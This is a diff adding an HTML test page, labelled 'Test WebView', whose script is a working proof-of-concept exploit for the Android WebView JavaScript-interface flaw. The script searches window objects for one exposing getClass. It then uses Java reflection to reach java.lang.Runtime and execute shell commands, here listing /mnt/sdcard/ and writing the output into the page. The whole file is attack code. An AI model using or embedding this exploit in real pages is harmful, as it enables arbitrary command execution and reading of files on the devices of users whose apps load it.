@@ -1,0 +1,38 @@
+<html>
+  <head>
+    <script>
+      var i=0;
+      
+          function getContents(inputStream)
+	{
+		var contents = ""+i;
+		var b = inputStream.read();
+		var i = 1;
+		while(b != -1) {
+			var bString = String.fromCharCode(b);
+			contents += bString;
+			b = inputStream.read();
+		}
+        i=i+1;
+		return contents;
+	}
+      
+       function execute(cmdArgs)
+	 {
+        for (var obj in window) {
+            if ("getClass" in window[obj]) {
+                alert(obj);
+                return  window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+         }
+	 } 
+
+      
+      var p = execute(["ls","/mnt/sdcard/"]);
+      document.write(getContents(p.getInputStream()));
+    </script>
+  </head>
+  <body>
+    Test WebView
+  </body>
+</html>
